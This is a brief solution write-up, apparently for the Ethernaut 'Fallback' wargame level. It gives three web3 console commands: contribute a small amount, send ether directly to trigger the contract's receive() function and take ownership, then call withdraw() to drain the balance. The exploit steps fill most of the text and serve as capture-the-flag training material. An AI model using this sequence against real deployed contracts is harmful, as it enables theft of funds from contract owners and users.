=> https://ethereum.stackexchange.com/questions/53094/sending-ether-via-contract-instance

Solution: 

1) await contract.contribute({from: player, value: toWei('0.0001')})
=> see receive() function, we can execute that if contributions[msg.sender] has some value
=> execute contribute() function

2) await web3.eth.sendTransaction({from: player, to: instance, value: '1'})
=> execute receive() function

3) await contract.withdraw()
=> reduce balance to 0
